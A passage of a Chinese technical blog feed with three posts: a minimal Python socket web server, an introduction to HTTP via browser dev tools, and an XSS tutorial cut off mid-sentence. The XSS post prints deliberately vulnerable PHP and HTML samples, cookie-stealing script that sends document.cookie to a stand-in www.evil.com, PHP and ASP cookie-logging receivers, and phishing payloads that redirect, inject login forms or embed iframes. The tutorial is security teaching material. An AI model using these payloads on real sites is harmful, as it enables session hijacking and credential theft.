        <content type="html"><![CDATA[<p>本文使用python写个简单的Web静态服务器</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line">HTML_ROOT_DIR = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_client</span><span class="params">(client_socket)</span>:</span></span><br><span class="line">    <span class="string">"""处理客户端请求"""</span></span><br><span class="line">    <span class="comment"># 获取客户端数据</span></span><br><span class="line">    request_data = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">"request data:"</span>,request_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造响应数据</span></span><br><span class="line">    response_start_line = <span class="string">"HTTP/1.1 200 0k\r\n"</span></span><br><span class="line">    response_headers = <span class="string">"Server: My testserver\r\n"</span></span><br><span class="line">    response_body = <span class="string">"hello world"</span></span><br><span class="line">    response = response_start_line + response_headers+ <span class="string">"\r\n"</span>+ response_body</span><br><span class="line">    print(<span class="string">"response:"</span>,response)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 向客户端发送数据</span></span><br><span class="line">    client_socket.send(bytes(response,<span class="string">"utf-8"</span>))</span><br><span class="line">    <span class="comment"># 关闭客户端连接</span></span><br><span class="line">    client_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    server_socket.bind((<span class="string">""</span>,<span class="number">8000</span>))</span><br><span class="line">    server_socket.listen(<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket, client_address = server_socket.accept()</span><br><span class="line">        print(<span class="string">"[%s,%s]用户连接上了"</span>%client_address)</span><br><span class="line">        handle_client_process = Process(target=handle_client, args=(client_socket,))</span><br><span class="line">        handle_client_process.start()</span><br><span class="line">        client_socket.close()</span><br></pre></td></tr></table></figure><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406python06.png" alt=""></p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406python07.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Web服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【python-Web服务器】1.1 HTTP协议简介</title>
      <link href="2020/04/06/1.1%20HTTP%E5%8D%8F%E8%AE%AE%E7%AE%80%E4%BB%8B/"/>
      <url>2020/04/06/1.1%20HTTP%E5%8D%8F%E8%AE%AE%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<p>本文主要结合浏览器开发者工具理解HTTP协议，分析浏览器与服务器之间的请求和响应。</p><a id="more"></a><h3 id="0x01-使用谷歌-火狐浏览器分析"><a href="#0x01-使用谷歌-火狐浏览器分析" class="headerlink" title="0x01 使用谷歌/火狐浏览器分析"></a>0x01 使用谷歌/火狐浏览器分析</h3><ul><li><p>在Web应用中，服务器把网页传给浏览器，实际上就是把网页的HTML代码发送给浏览器，让浏览器显示出来。而浏览器和服务器之间的传输协议是HTTP,所以：</p><ul><li>HTML是一种用来定义网页的文本</li><li>HTTP是在网络上传输HTML的协议，用于浏览器和服务器的通信</li></ul></li><li><p>Chrome浏览器提供了完整的调试工具，非常适合Web开发。在Chrome浏览器（更多工具–&gt;开发者工具）或者Windows下F12<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406python01.png" alt=""><br>说明</p><ul><li>Elements显示网页的结构</li><li>Network显示浏览器和服务器的通信</li></ul></li></ul><p>点击Network，确保第一个小红灯亮着，Chrome就会记录所有浏览器和服务器之间的通信：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406python02.png" alt=""></p><h3 id="0x02-HTTP协议分析"><a href="#0x02-HTTP协议分析" class="headerlink" title="0x02 HTTP协议分析"></a>0x02 HTTP协议分析</h3><p>当在地址栏输入<code>www.baidu.com</code>时,浏览器显示百度首页。在这个过 程中，浏览器都干了哪些事情呢？通过Network的记录，我们就可以知道。 在Network中，找到<code>www.baidu.com</code>那条记录，点击，右侧将显示Request Headers，点击右侧的view-source，我们就可以看到浏览器发给百度服务器的请求：</p><h4 id="2-1-浏览器请求"><a href="#2-1-浏览器请求" class="headerlink" title="2.1 浏览器请求"></a>2.1 浏览器请求</h4><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406python03.png" alt=""></p><ul><li>说明：（最主要的头两⾏分析如下）<ul><li>第⼀⾏<code>GET / HTTP/1.1</code>：GET表示⼀个读取请求，将从服务器获得⽹⻚数据，/表示URL的路径，URL 总是以/开头，/就表示⾸⻚，最后的HTTP/1.1指示采⽤的HTTP协议版本是 1.1。⽬前HTTP协议的版本就是1.1，但是⼤部分服务器也⽀持1.0版本，主 要区别在于1.1版本允许多个HTTP请求复⽤⼀个TCP连接，以加快传输速 度。</li><li>从第⼆⾏开始，每⼀⾏都类似于Xxx: abcdefg：<br><code>Host: www.baidu.com</code>，表示请求的域名是<code>www.baidu.com</code>。如果⼀台服务器有多个⽹站，服务器就需 要通过Host来区分浏览器请求的是哪个⽹站。</li></ul></li></ul><h4 id="2-2-服务器响应"><a href="#2-2-服务器响应" class="headerlink" title="2.2 服务器响应"></a>2.2 服务器响应</h4><p>继续找到Response Headers，点击view-source，显示服务器返回的原始响应数据：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406python04.png" alt=""></p><ul><li>HTTP响应分为Header和Body两部分（Body是可选项），我们在Network中 看到的Header最重要的⼏⾏如下：<ul><li><code>HTTP/1.1 200 OK</code>：200表示⼀个成功的响应，后⾯的OK是说明。</li></ul></li><li>如果返回的不是200，那么往往有其他的功能，例如<ul><li>失败的响应有404    Not    Found：网⻚不存在</li><li>500    Internal Server    Error：服务器内部出错 </li><li>等等…</li></ul></li><li><code>Content-Type:text/html</code>：Content-Type指示响应的内容，这⾥是text/html表示HTML⽹⻚。<blockquote><p>请注意，浏览器就是依靠Content-Type来判断响应的内容是网页还是图⽚，是视频还是⾳乐。浏览器并不靠URL来判断响应的内容，所以，即使URL是    <code>http://www.baidu.com/meimei.jpg</code>，它也不⼀定就是图⽚。</p></blockquote></li><li>HTTP响应的Body就是HTML源码，右键查看网页源码，就是查看响应的body<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406python05.png" alt=""></li></ul><h5 id="浏览器解析过程"><a href="#浏览器解析过程" class="headerlink" title="浏览器解析过程"></a>浏览器解析过程</h5><blockquote><p>当浏览器读取到百度⾸⻚的HTML源码后，它会解析HTML，显示⻚⾯，然后，根据HTML⾥⾯的各种链接，再发送HTTP请求给百度服务器，拿到相应的图⽚、视频、Flash、JavaScript脚本、CSS等各种资源，最终显示出⼀个完整的⻚⾯。所以我们在Network下⾯能看到很多额外的HTTP请求</p></blockquote><h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><h4 id="3-1-HTTP请求"><a href="#3-1-HTTP请求" class="headerlink" title="3.1 HTTP请求"></a>3.1 HTTP请求</h4><h5 id="步骤1：浏览器⾸先向服务器发送HTTP请求，请求包括："><a href="#步骤1：浏览器⾸先向服务器发送HTTP请求，请求包括：" class="headerlink" title="步骤1：浏览器⾸先向服务器发送HTTP请求，请求包括："></a>步骤1：浏览器⾸先向服务器发送HTTP请求，请求包括：</h5><ul><li>⽅法：GET还是POST，GET仅请求资源，POST会附带⽤户数据；</li><li>路径：/full/url/path；</li><li>域名：由Host头指定；</li><li>以及其他相关的Header；</li></ul><p>如果是POST，那么请求还包括⼀个Body，包含⽤户数据</p><h5 id="步骤2：服务器向浏览器返回HTTP响应，响应包括："><a href="#步骤2：服务器向浏览器返回HTTP响应，响应包括：" class="headerlink" title="步骤2：服务器向浏览器返回HTTP响应，响应包括："></a>步骤2：服务器向浏览器返回HTTP响应，响应包括：</h5><ul><li>响应代码：200表示成功，3xx表示重定向，4xx表示客户端发送的请求 有错误，5xx表示服务器端处理时发⽣了错误；</li><li>响应类型：由Content-Type指定；</li><li>以及其他相关的Header；</li></ul><p>通常服务器的HTTP响应会携带内容，也就是有⼀个Body，包含响应的 内容，⽹⻚的HTML源码就在Body中。</p><h5 id="步骤3：如果浏览器还需要继续向服务器请求其他资源，-⽐如图⽚，就再次发出HTTP请求，重复步骤1、2"><a href="#步骤3：如果浏览器还需要继续向服务器请求其他资源，-⽐如图⽚，就再次发出HTTP请求，重复步骤1、2" class="headerlink" title="步骤3：如果浏览器还需要继续向服务器请求其他资源， ⽐如图⽚，就再次发出HTTP请求，重复步骤1、2"></a>步骤3：如果浏览器还需要继续向服务器请求其他资源， ⽐如图⽚，就再次发出HTTP请求，重复步骤1、2</h5><blockquote><p>Web采⽤的HTTP协议采⽤了⾮常简单的请求-响应模式，从⽽⼤⼤简化 了开发。当我们编写⼀个⻚⾯时，我们只需要在HTTP请求中把HTML 发送出去，不需要考虑如何附带图⽚、视频等，浏览器如果需要请求图 ⽚和视频，它会发送另⼀个HTTP请求，因此，⼀个HTTP请求只处理 ⼀个资源(此时就可以理解为TCP协议中的短连接，每个链接只获取⼀ 个资源，如需要多个就需要建⽴多个链接)</p></blockquote><h4 id="3-2-HTTP格式"><a href="#3-2-HTTP格式" class="headerlink" title="3.2 HTTP格式"></a>3.2 HTTP格式</h4><p>每个HTTP请求和响应都遵循相同的格式，⼀个HTTP包含Header和Body两 部分，其中Body是可选的。<br>HTTP协议是⼀种⽂本协议，所以，它的格式也⾮常简单</p><h5 id="HTTP-GET请求的格式："><a href="#HTTP-GET请求的格式：" class="headerlink" title="HTTP    GET请求的格式："></a>HTTP    GET请求的格式：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET&#x2F;pathHTTP&#x2F;1.1</span><br><span class="line">Header1:Value1</span><br><span class="line">Header2:Value2</span><br><span class="line">Header3:Value3</span><br></pre></td></tr></table></figure><p>每个Header⼀⾏⼀个，换⾏符是\r\n</p><h5 id="HTTP-POST请求的格式："><a href="#HTTP-POST请求的格式：" class="headerlink" title="HTTP    POST请求的格式："></a>HTTP    POST请求的格式：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST&#x2F;pathHTTP&#x2F;1.1</span><br><span class="line">Header1:Value1</span><br><span class="line">Header2:Value2</span><br><span class="line">Header3:Value3</span><br><span class="line"></span><br><span class="line">bodydatagoeshere...</span><br></pre></td></tr></table></figure><p>当遇到连续两个\r\n时，Header部分结束，后⾯的数据全部是Body</p><h5 id="HTTP响应的格式："><a href="#HTTP响应的格式：" class="headerlink" title="HTTP响应的格式："></a>HTTP响应的格式：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">200OK</span><br><span class="line">Header1:Value1</span><br><span class="line">Header2:Value2</span><br><span class="line">Header3:Value3</span><br><span class="line"></span><br><span class="line">bodydatagoeshere...</span><br></pre></td></tr></table></figure><p>HTTP响应如果包含body，也是通过\r\n\r\n来分隔的</p><blockquote><p>请再次注意，Body的数据类型由Content-Type头来确定，如果是⽹⻚，Body就是⽂本，如果是图⽚，Body就是图⽚的⼆进制数据。</p></blockquote><blockquote><p>当存在Content-Encoding时，Body数据是被压缩的，最常⻅的压缩⽅式是gzip，所以，看到Content-Encoding:gzip时，需要将Body数据先解压缩，才能得到真正的数据。压缩的⽬的在于减少Body的⼤⼩，加快⽹络传输。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Web服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【XSS（一）】1.1 XSS介绍与原理</title>
      <link href="2020/04/06/1.1%20XSS%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%8E%9F%E7%90%86/"/>
      <url>2020/04/06/1.1%20XSS%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>本文主要整理了XSS相关知识，XSS类别、利用、危害以及简单的实例分析。</p><a id="more"></a><h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h2><h3 id="1-1-XSS简介"><a href="#1-1-XSS简介" class="headerlink" title="1.1 XSS简介"></a>1.1 XSS简介</h3><p>跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序<strong>对用户的输入过滤不足</strong>而产生的。攻击者利用网站漏洞把<strong>恶意的脚本代码注入</strong>到网页中，当<strong>其他用户</strong>浏览这些网页时，就会<strong>执行其中的恶意代码</strong>，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击 </p><p> <strong>关键点：</strong> </p><p>目标网站的目标用户</p><ul><li>浏览器</li><li>不被预期的： 攻击者在输入时提交了可控的脚本内容，然后在输出时<strong>被浏览器解析执行</strong></li><li>“跨站脚本”重点是脚本：XSS在攻击时会嵌入一段远程的第三方域上的脚本资源。</li></ul><p><strong>总之，要想尽一切办法将你的脚本内容在目标网站中目标用户的浏览器上解释执行</strong></p><h3 id="1-2-XSS分类"><a href="#1-2-XSS分类" class="headerlink" title="1.2 XSS分类"></a>1.2 XSS分类</h3><h4 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h4><ul><li><p>反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。</p></li><li><p>反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p></li><li><p>服务器端代码： </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>  可以看到，代码直接引用了 <code>name</code> 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。 </p></li></ul><h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><ul><li><p>持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</p></li><li><p>此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p></li><li><p>服务器端代码： </p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = mysql_real_escape_string( $message );</span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = mysql_real_escape_string( $name );</span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">    <span class="comment">//mysql_close(); &#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>   代码只对一些空白符、特殊符号、反斜杠进行了删除或转义，没有做 XSS 的过滤和检查，且存储在数据库中，明显存在存储型 XSS 漏洞。 </p></li></ul><h4 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h4><ul><li><p>传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。 </p></li><li><p>HTML 代码： </p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM-XSS test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> a=<span class="built_in">document</span>.URL;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.write(a.substring(a.indexOf(<span class="string">"a="</span>)+<span class="number">2</span>,a.length));</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>   将代码保存在 domXSS.html 中，浏览器访问： </p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;domXSS.html?a&#x3D;&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>  DOM型与前两者的差别是，只在客户端进行解析，不需要服务器的解析响应</p></li></ul><h3 id="1-3-XSS-利用方式"><a href="#1-3-XSS-利用方式" class="headerlink" title="1.3 XSS 利用方式"></a>1.3 XSS 利用方式</h3><h4 id="Cookies-窃取"><a href="#Cookies-窃取" class="headerlink" title="Cookies 窃取"></a>Cookies 窃取</h4><ul><li><p>攻击者可以使用以下代码获取客户端的 Cookies 信息 ：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">document</span>.location=<span class="string">"http://www.evil.com/cookie.asp?cookie="</span>+<span class="built_in">document</span>.cookie</span><br><span class="line"><span class="keyword">new</span> Image().src=<span class="string">"http://www.evil.com/cookie.asp?cookie="</span>+<span class="built_in">document</span>.cookie</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;img src="http:/</span><span class="regexp">/www.evil.com/</span>cookie.asp?cookie=<span class="string">"+document.cookie&gt;&lt;/img&gt;</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>在远程服务器上，有一个接受和记录 Cookies 信息的文件，示例如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  msg&#x3D;Request.ServerVariables(&quot;QUERY_STRING&quot;)</span><br><span class="line">  testfile&#x3D;Server.MapPath(&quot;cookie.txt&quot;)</span><br><span class="line">  set fs&#x3D;server.CreateObject(&quot;Scripting.filesystemobject&quot;)</span><br><span class="line">  set thisfile&#x3D;fs.OpenTextFile(testfile,8,True,0)</span><br><span class="line">  thisfile.Writeline(&quot;&quot;&amp;msg&amp; &quot;&quot;)</span><br><span class="line">  thisfile.close</span><br><span class="line">  set fs&#x3D;nothing</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie = $_GET[<span class="string">'cookie'</span>];</span><br><span class="line">$log = fopen(<span class="string">"cookie.txt"</span>, <span class="string">"a"</span>);</span><br><span class="line">fwrite($log, $cookie . <span class="string">"\n"</span>);</span><br><span class="line">fclose($log);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>攻击者在获取到 Cookies 之后，通过修改本机浏览器的 Cookies，即可登录受害者的账户。 </p><h4 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h4></li><li><p>由于使用 Cookies 存在一定的安全缺陷，因此，开发者开始使用一些更为安全的认证方式，如 Session。在 Session 机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也有被其他人利用的可能。<strong>会话劫持的本质</strong>是在攻击中带上了 Cookies 并发送到了服务端。</p></li><li><p>如某 CMS 的留言系统存在一个存储型 XSS 漏洞，攻击者把 XSS 代码写进留言信息中，当管理员登录后台并查看是，便会触发 XSS 漏洞，由于 XSS 是在后台触发的，所以攻击的对象是管理员，通过注入 JavaScript 代码，攻击者便可以劫持管理员会话执行某些操作，从而达到<strong>提升权限</strong>的目的。 </p></li><li><p>比如，攻击者想利用 XSS 添加一个管理员账号，只需要通过之前的代码审计或其他方式，截取到添加管理员账号时的 HTTP 请求信息，然后使用 XMLHTTP 对象在后台发送一个 HTTP 请求即可，由于请求带上了被攻击者的 Cookies，并一同发送到服务端，即可实现添加一个管理员账户的操作。 </p></li></ul><h4 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h4><ul><li><p>重定向钓鱼</p><p>把当前页面重定向到一个钓鱼页面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.bug.com&#x2F;index.php?search&#x3D;&quot;&#39;&gt;&lt;script&gt;document.location.href&#x3D;&quot;http:&#x2F;&#x2F;www.evil.com&quot;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li><li><p>HTML 注入式钓鱼</p><p>使用 XSS 漏洞注入 HTML 或 JavaScript 代码到页面中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.bug.com&#x2F;index.php?search&#x3D;&quot;&#39;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;div style&#x3D;&quot;text-align:center;&quot;&gt;&lt;form Method&#x3D;&quot;POST&quot; Action&#x3D;&quot;phishing.php&quot; Name&#x3D;&quot;form&quot;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;Login:&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;login&quot; &#x2F;&gt;&lt;br &#x2F;&gt;Password:&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;Password&quot; type&#x3D;&quot;password&quot; &#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;Valid&quot; value&#x3D;&quot;Ok&quot; type&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;br&#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p> 该段代码会在正常页面中嵌入一个 Form 表单。 </p></li><li><p>iframe 钓鱼 </p><p>这种方式是通过<code>&lt;iframe&gt;</code>标签嵌入远程域的一个页面实施钓鱼。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.bug.com&#x2F;index.php?search&#x3D;&#39;&gt;&lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;www.evil.com&quot; height&#x3D;&quot;100%&quot; width&#x3D;&quot;100%&quot;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure></li><li><p>Flash 钓鱼 </p><p>将构造好的 Flash 文件传入服务器，在目标网站用 <code>&lt;object&gt;  或   &lt;embed&gt;</code> 标签引用即可。 </p></li><li><p>高级钓鱼技术 </p><p> 注入代码劫持 HTML 表单、使用 JavaScript 编写键盘记录器等。 </p></li></ul><h4 id="网页挂马"><a href="#网页挂马" class="headerlink" title="网页挂马"></a>网页挂马</h4><p> 一般都是通过篡改网页的方式来实现的，如在 XSS 中使用  <code>&lt;iframe&gt;</code>  标签 </p><h4 id="DOS-与-DDOS¶"><a href="#DOS-与-DDOS¶" class="headerlink" title="DOS 与 DDOS¶"></a>DOS 与 DDOS<a href="https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/#dos-ddos" target="_blank" rel="noopener">¶</a></h4><p>注入恶意 JavaScript 代码，可能会引起一些拒绝服务攻击。</p><h4 id="XSS-蠕虫-¶"><a href="#XSS-蠕虫-¶" class="headerlink" title="XSS 蠕虫 ¶"></a>XSS 蠕虫 <a href="https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/#xss_4" target="_blank" rel="noopener">¶</a></h4><p>通过精心构造的 XSS 代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能。</p><h4 id="Self-XSS-变废为宝的场景-¶"><a href="#Self-XSS-变废为宝的场景-¶" class="headerlink" title="Self-XSS 变废为宝的场景 ¶"></a>Self-XSS 变废为宝的场景 <a href="https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/#self-xss" target="_blank" rel="noopener">¶</a></h4><p>Self-XSS 顾名思义，就是一个具有 XSS 漏洞的点只能由攻击者本身触发，即自己打自己的攻击。比如个人隐私的输入点存在 